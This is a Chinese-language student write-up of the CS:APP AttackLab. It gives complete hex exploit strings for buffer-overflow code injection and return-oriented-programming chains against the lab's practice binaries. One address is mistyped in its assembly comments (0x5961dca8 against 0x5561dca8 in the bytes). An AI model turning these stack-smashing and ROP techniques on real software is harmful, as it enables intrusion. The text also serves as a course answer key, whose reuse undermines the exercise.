# AttackLab
------------------------------
## 实验目的:
由于C语言中gets()不检查输入字符的边界,可能导致栈被破坏.造成漏洞,这个Lab就用来Attack原始代码,使原始代码执行不应该执行的那部分程序.包括两部分:      
   
- Code Injection Attacks    
- Return-Oriented Programming
   
第一个部分包括3个phase, 是利用字符串将重定向程序以执行现有过程。   
第二个部分
## 实验准备:
- GDB调试工具
- GDB调试常用命令

## 实验过程
首先用```objdump -d ctarget > ctarget_disassemble.txt```将```ctarget```和```rtarget```反汇编到文件中.   
方便分析.   
## PartI Code Injection Attacks
### Phase1 : 执行Touch1
由题意可得,```test()```函数中调用了```getbuf()```读入字符串,且调用完后,返回.即:
  
	1 void test()
	2 {
	3 int val;
	4 val = getbuf();
	5 printf("No exploit. Getbuf returned 0x%x\n", val);
	6 }
那么我们调用```getbuf()```后,可能栈会遭到破会,从而返回的函数地址发生变化.这样就不是```printf(...)```作为返回了.   
什么函数用到了```test()```?  
发现```launch()```的汇编代码中有:```callq 401968 <test>```,而```main()函数```中的```stable_launch()```中又调用了```launch()```.   
故我们只需关心```stable_launch()```函数即可,我们继续观察```getbuf()```.

	 00000000004017a8 <getbuf>:
	  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
	  4017ac:	48 89 e7             	mov    %rsp,%rdi
	  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
	  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
	  4017b9:	48 83 c4 28          	add    $0x28,%rsp
	  4017bd:	c3                   	retq   
	  4017be:	90                   	nop
	  4017bf:	90                   	nop

首先```sub $0x28 , %rsp```.说明BUFFER_SIZE为40个字节.我们在观察```touch()```函数的地址,为:
```00000000004017c0 <touch1>:````.   

故此时答案已经可以确定了,首先我们给随便40个字节的字符,之后再加上我们要跳转的地址(8字节),即:
```c0 17 40 00 00 00 00 00```这里是小端方式,故答案如下:  
![](https://i.imgur.com/wb0kwKI.png) 

### Phase2:插入攻击代码,执行Touch2()
这个phase目的是,插入一小段攻击代码,并顺利执行```Touch2()```.
   
	1 void touch2(unsigned val)
	2 {
	3 vlevel = 2; / * Part of validation protocol* /
	4 if (val == cookie) {
	5 printf("Touch2!: You called touch2(0x%.8x)\n", val);
	6 validate(2);
	7 } else {
	8 printf("Misfire: You called touch2(0x%.8x)\n", val);
	9 fail(2);
	10 }
	11 exit(0);
	12 }

即在执行Touch2()之前,我们需要设置参数```val```,使其等于我们各自的```cookie```.      
故根据```Phase1()```,我们将攻击代码写入到字符串中,并修改返回地址,使返回地址变成这个字符串的开头,这样就可以执行我们需要的代码了.     
编写攻击代码如下:   

	mov $0x59b997fa , %rdi  # 将cookie值放入rdi中,作为参数
	pushq $0x4017ec         # 关键一步,我们将Touch2()的地址入栈.以便执行
	retq                    # 这一步也关键,retq将rip指针指向返回地址,即修改后的$0x4017ec,即执行Touch2()

然后,放完缓冲区之后,紧接着就是修改返回地址.那么返回地址按我们的想法应该改为字符buffer的起始地址.也就是```sub 0x28, %rsp```之后的```rsp```的值.在执行该语句之前,rsp为```0x5561dca0``` .进入GDB调试:  
![](https://i.imgur.com/1bexbZ2.png)
得到```0x5561dc78```.故这就是我们需要的返回地址.   
那么答案就得到了:    
首先将攻击代码翻译为机器码:        
step1: ```gcc -c touch2.s```     
step2: ```objdump -d touch2.o > touch2.d```     
```touch2.d```中保存的即为机器码:  
![](https://i.imgur.com/lrXezYs.png)
接着,我们将返回地址也填入字符buffer中,最终的答案即为:

	48 c7 c7 fa 97
	b9 59 68 ec 17
	40 00 c3 00 00
	00 00 00 00 00
	00 00 00 00 00
	00 00 00 00 00
	00 00 00 00 00
	00 00 00 00 00
	78 dc 61 55 00
	00 00 00

这里面有几个细节要注意一下:
    
- 首先,在```getbuf()```执行到```retq```后,这个时候才开始跳转到buffer起始地址,并准备执行攻击代码.      
此时rsp指针地址也不再是第一次准备执行```getbuf()```时的地址了,而是又向上(向栈底)增大了8个字节.即从```0x5561dca0```变为```0x5561dca8```,这就是由于```getbuf()```执行了```retq```,返回地址被弹出,所以```rsp```向栈底移动.  
- 然后开始执行攻击代码,此处可以看作一次```callq```,攻击代码中```pushq $0x4017ec <Touch2()>```,将```Touch2()```地址入栈,此时```rsp```地址为```0x5561dca0```,也就是这个调用攻击代码栈帧中的"返回地址",值为```Touch2()```起始地址.之后再次调用```retq```,同理此时弹出```pop``` "返回地址",此时```rip```就指向了```Touch2()```.同时,由于popq了返回地址,此时```rsp```又变为```0x5561dca8```.
- 总结来说,返回"攻击代码"实际上时一次```call和ret```,用这个```ret```来```call Touch2()```.


### Phase3 : 执行Touch3()
```cookie = 59b997fa```  
和level2同理,注入攻击代码,执行touch3().首先看一下Touch3():

	11 void touch3(char * sval)
	12 {
	13 vlevel = 3; / * Part of validation protocol * /
	14 if (hexmatch(cookie, sval)) {
	15 printf("Touch3!: You called touch3(\"%s\")\n", sval);
	16 validate(3);
	17 } else {
	18 printf("Misfire: You called touch3(\"%s\")\n", sval);
	19 fail(3);
	20 }
	21 exit(0);
	22 }

此处```Touch3()```又进一步调用了```hexmatch()```函数,且```touch3()```的参数是一个指针,这意味着我们要将字符串的地址传给```rdi```.    
在分析```hexmatch()```:
   
	2 int hexmatch(unsigned val, char * sval)
	3 {
	4 char cbuf[110];
	5 / * Make position of check string unpredictable * /
	6 char * s = cbuf + random() % 100;
	7 sprintf(s, "%.8x", val);
	8 return strncmp(sval, s, 9) == 0;
	9 }

此处由于有一个较大的char数组,且在这个数组中不确定的位置开始,修改为```cookie```的字符串表示.故```hexmatch()```势必会在栈上保存他的局部变量.至于修改哪九个字节,这取决于random的值了.   
故我们在```getbuf()```函数中的读入40个字节的```buffer```,也有可能会被修改.   
这样的话就导致,如果我们将```cookie```的字符串表示(```也就是sval```),放在buffer中,那么可能会被```hexmatch()```修改.所以我们需要GDB调试,看看哪些单元是不会被修改的,然后我们再将```sval```存到哪里,并将他的地址给```rdi```,这样就会顺利执行了.
此处注意,这个```random()```,每次程序开始运行的值是相同的,因为他的**seed一直是默认**.
GDB调试: 
我们在```hexmatch()```前后设置断点,观察前后的```buffer```区域的变化:   
![](https://i.imgur.com/yMwXD55.png) 
buffer区域从```0x5561dc78```开始.   
运行前:  
![](https://i.imgur.com/IzbxU5G.png)   
  
运行后:    
![](https://i.imgur.com/UY01g9j.png)    
可以看到,```0x5561dc78```到```0x5561dca0```都被修改了,是不安全的.    
故我们可以选择```0x5561dca8```或者```0x5561dcb8```的8个字节存放我们的cookie字符串.       
(他们其实都是0x0,该实验结果是拿正确答案进行调试的)
故答案就显而易见了:    
首先注入代码:   

	mov $0x5961dca8 , %rdi  # 将cookie字符串的地址放入rdi中,作为参数
	pushq $0x4018fa         # 我们将Touch3()的地址入栈.以便执行
	retq                    

之后翻译成机器码,接着在```0x5961dca8```的单元上放入字符串"59b997fa",这是cookie.   
注意字符串我们仍然要转为ASCII码的hex表示,也就是"35 39 62 39 39 37 66 61".   
故最终的输入为:  

	48 c7 c7 a8 dc 
	61 55 68 fa 18 
	40 00 c3 00 00 
	00 00 00 00 00 
	00 00 00 00 00 
	00 00 00 00 00 
	00 00 00 00 00 
	00 00 00 00 00 
	78 dc 61 55 00 
	00 00 00 35 39
	62 39 39 37 66
	61

![](https://i.imgur.com/s11YGKR.png)


## Part II Return-Oriented Programming
即在这种情况下,首先每次运行程序时的stack起始地址都不同.   
其次我们手动注入的代码可能无法运行(被设为只读,不可执行).   
故我们只能修改函数的返回地址,并调用已有的可执行代码进行攻击.

### Phase4 利用Return-Oriented Programming运行Touch2
目的和之前的Phase2相同,即首先```mov cookie, rdi```,在```call <touch2>```    
此时我们在buffer区域注入的代码无法执行,我们只能修改stack中的返回地址,并去找现有的可执行代码.   

对于```mov cookie, rdi```,我们可以首先将```cookie```PUSH进栈,接着```popq rax```,最后在```movq rax , rdi```      
其次,```callq <touch2>```,事先将```<touch2>```的地址PUSH进栈,那么"小工具"执行到```retq```后,就会```popq rip```.即执行```touch2```.

故,整个栈的情况为  

| stack地址从上到下递减 |  地址 |
| --------- | ------  |
| (touch2)的地址 | 0x4017ec |
| (mov rax , rdi)指令的地址 |  0x4019a2 |
| 0x59b997fa(cookie的值) | 0x59b997fa |
| (popq,rax)指令的地址 | 0x4019cc |

故找```farm```中的已有代码,并对照机器码和汇编指令的翻译,可得到最后结果: 

	00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00
	cc 19 40 00 00 00 00 00
	fa 97 b9 59 00 00 00 00
	a2 19 40 00 00 00 00 00
	ec 17 40 00 00 00 00 00

### Phase5 利用Return-Oriented Programming运行Touch3
同上一个Phase,需要用现有可执行代码执行Touch3.   
分析Touch3正常需要哪些指令:   

	mov $0x5961dca8 , %rdi  # 将cookie字符串的地址放入rdi中,作为参数
	pushq $0x4018fa         # 我们将Touch3()的地址入栈.以便执行
	retq

现在```rsp```地址不确定,故我们第一条指令,只能先获取```rsp```地址,在加上```cookie字符串地址的偏移量x```,得到```cookie```的地址.   
之后再传入```rdi```,再调用```touch3()```.        
由于现有的代码限制,我们只能选用可用的,故调整好的代码如下:
  
| 栈底 | 存放内容|
| ----- | ---- | 
| cookie字符串 | "59b997fa"的字符串表示|
| touch3()地址 | 0x4018fa |
| mov %rax,%rdi |  0x4019a2 |
| lea(%rdi,%rsi ,1), %rax | 0x4019d6 |
| mov %ecx , %esi | 0x401a13 |
| mov %edx , %ecx | 0x401a70 |
| mov %eax , %edx | 0x4019dd |
| cookie偏移量常数 | 0x48 |
| popq %rax | 0x4019cc |
| mov %rax , %rdi | 0x4019a2 |
| mov %rsp , %rax | 0x401a06 |
| **栈顶**|      

故答案很显而易见了:   

	00 00 00 00 00 
	00 00 00 00 00 
	00 00 00 00 00 
	00 00 00 00 00 
	00 00 00 00 00 
	00 00 00 00 00 
	00 00 00 00 00 
	00 00 00 00 00 
	06 1a 40 00 00 00 00 00
	a2 19 40 00 00 00 00 00  
	cc 19 40 00 00 00 00 00  
	48 00 00 00 00 00 00 00  
	dd 19 40 00 00 00 00 00  
	70 1a 40 00 00 00 00 00  
	13 1a 40 00 00 00 00 00  
	d6 19 40 00 00 00 00 00  
	a2 19 40 00 00 00 00 00  
	fa 18 40 00 00 00 00 00  
	35 39 62 39 39 37 66 61
	00
	  
## 实验总结 
实际上,我们调用函数,每一个函数都有一个栈帧.      
比如```P()```调用```Q()```时,即调用```callq```的时候,P的栈帧首先```push```进```"返回地址"```(也就是调用完Q()后的下一条指令的地址),之后再是```Q()```的栈帧,然后```Q()```完成返回的时候,```rsp```值变大,收回```Q()```的栈帧,同时P栈帧的"返回地址"单元也会被```popq rip```.    
也就是说```retq``` , 等价于 ```popq rip```.
```callq <x>``` 等价于 ```pushq <x>完成后的下一条指令地址```.    

所以我们攻击程序,就是修改那个 "返回地址",以运行我们的代码,无论是自己注入的,还是已有的.